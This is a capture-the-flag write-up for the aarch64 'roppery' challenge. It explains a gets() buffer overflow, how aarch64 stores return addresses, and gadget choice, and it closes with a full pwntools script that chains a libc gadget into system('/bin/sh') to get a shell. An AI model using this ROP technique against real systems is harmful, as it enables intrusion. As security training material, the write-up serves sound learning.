### Description

We are given a netcat port and a zip-file, containing the source binary and libc file.

>**Proposed Defficulty:** Medium
>
>Nogen har stjålet mit x86-64 program, du må få det her i stedet: [roppery.zip](https://nextcloud.ntp-event.dk:8443/s/DPcMRF5dqsS3FEm/download/roppery.zip)
>
>`nc roppery.hkn 1024`
>
>_Hint: Du får måske bruge for nogle af disse:_
>
>`sudo apt install qemu-user libc6-arm64-cross gdb-multiarch`
>
>_Programmet kan så køres med:_
>
>`qemu-aarch64 -L /usr/aarch64-linux-gnu roppery`

---

### Getting it to run

First of all, patching the binary with pwninit is a good idea, as libc is provided. Secondly, installing the recommended packages is a also good idea. Afterwards, the file can be run using the specified command. However, if we try to run it directly (`./roppery_patched`), it will complain about a missing library `ld-linux-aarch64.so.1`. With qemu `libc6-arm64-cross`, it can be found under a different folder, and simply copying it to `/lib` will allow you to run the file directly. As for debugging, I personally had a hard time getting `gdb-multiarch` to work independently, but debugging from pwntools seems to work fine.

---

### Vulnerability

As the source is provided, decompiling is probably the best bet. Here, we find two functions of interest: `main` and `robbery`. As `robbery` is called by main, we simply jump into robbery:

```c
void robbery(void)

{
  char buff [64];
  
  puts("\x1b[31mTHIS IS A ROBBERY, HAND OVER ALL YOUR MONEY!");
  sleep(1);
  printf("\x1b[33mNoooo, please don\'t take my money, take this instead: %p\n",puts);
  sleep(1);
  puts("\x1b[31mI TAKE WHAT I WANT, ANY FINAL WORDS?");
  sleep(1);
  printf("\x1b[33m> ");
  gets(buff);
  sleep(1);
  puts("\x1b[31mDON\'T YOU EVEN THINK OF TRYING TO ESCAPE!");
  sleep(1);
  return;
}
```

And the vulnerability on `gets` is very obvious. We are also given the address of `puts`, so no leaking necessary. However, as the binary is aarch64, it will probably be more complicated than one would hope.

---

### ROP on aarch64

Function calls work *slightly* differently on arm, and as a result, ROP chains and their gadgets are also different.

First of all, the destination of `ret` is not popped off the stack like in x86. Instead, the x30 register determines where `ret` goes. During nested function calls, this address is stored on the stack, just like in x86. It is then taken from the stack at the end of a function, together with the x29 register, which is the frame pointer, in an instruction that usually looks like this:

```asm
ldp        x29, x30, [sp]
```

In contrast to x86, the stack frame would seem to be flipped, with the stack frame and return instruction pointer stored *below* any local variables. We can actually see this in the disassembly:

```asm
add        x0, sp, #0x10
bl         <EXTERNAL>::gets
```

and:

```asm
ldp        x29, x30, [sp], #0x50
ret
```

The `ldp` instruction loads 2 consecutive values from the given address, in this case `sp`. However, the buffer base is initialized to `sp` + 0x10, just above x29 and x30.

This is a problem for ROP, because it makes us unable to overwrite the return pointer and control the execution flow. That is, unless the function is nested, in which case, the return base pointer and instruction pointer of the function above the current function, is stored right in the way of the buffer overflow.

We can actually see this if we debug the program:

```
gdb-peda$ x/12gx $sp
0x55007ffbb0:	0x00000055007ffc00	0x000000000040094c
0x55007ffbc0:	0x4141414141414141	0x4141414141414141
0x55007ffbd0:	0x4141414141414141	0x4141414141414141
0x55007ffbe0:	0x4141414141414141	0x4141414141414141
0x55007ffbf0:	0x4141414141414141	0x4141414141414141
0x55007ffc00:	0x00000055007ffc00	0x0000005500877780
```

The two values up top are the values to be popped by `ldp`, the right one referring to main. In the middle is our buffer, and the values at the bottom is to return into libc.

This allows us to redirect execution flow. The only remaining issue, is to figure out, what we are going to call. The obvious thing to do, is to call `system("/bin/sh")`. 

In order to do so, we must control the register x0, which is equivalent to rdi in x86-64. There are multiple ways to go about this. We must again remember arm conventions: Because ret effectively jumps to x30, any gadget we use must control x30, otherwise we end up in an infinite loop. Combine this with the fact, that `ldr` often loads values at different offsets from `sp`, and the best solution is not always obvious.

In my case, I came up with this gadget:

```
0x000000000004a3a0: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;
```

I found it to be a good gadget, because it doesn't require an intermediate register to get a value into x0. However, it also takes a large offset 0x78, but that isn't a problem in our case, due to our infinite overflow.

---

### Solution

I came up with this final solve script:

```python
from pwn import *

elf = context.binary = ELF("./roppery_patched")
libc = ELF("./libc.so.6")

context.gdbinit = "~/tools/peda/peda.py"
# conn = gdb.debug("./roppery_patched", '''
# b *0x0000000000400930
# b *0x40092c
# c
# ''')

# conn = process("./roppery_patched")
conn = connect("roppery.hkn", 1024)

conn.recvuntil(b": ")
leak = conn.recvline()[:-1]
leak = eval(leak)
libc.address = leak - libc.sym["puts"]

print(f"Leaked libc address {hex(libc.address)}")

payload = b"AAAAAAAA" * 9  # Pad until return x30
payload += p64(libc.address + 0x4a3a0)  # ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;
payload += b"AAAAAAAA" * 3  # Pad until next x30 address (sp incremented by 80 in robbery)
payload += p64(libc.sym["system"])
payload += p64(next(libc.search(b"/bin/sh\x00"))) * 100  # Address is loaded from sp + 0x78, but who cares

conn.sendline(payload)
conn.interactive()
```

There are a few things to notice, for instance the address of `system` needs to be 0x18 bytes away from the first gadget, due to imm incrementing `sp` to that point. Additionally, no fine offset has been calculated for /bin/sh, because I am lazy. As I didn't solve the challenge during the ctf, I have no flag, but I have tested the script, and it does work. For additional information on aarch64 ROP, I can recommend [this](https://blog.perfect.blue/ROPing-on-Aarch64) article, which really helped me understand it.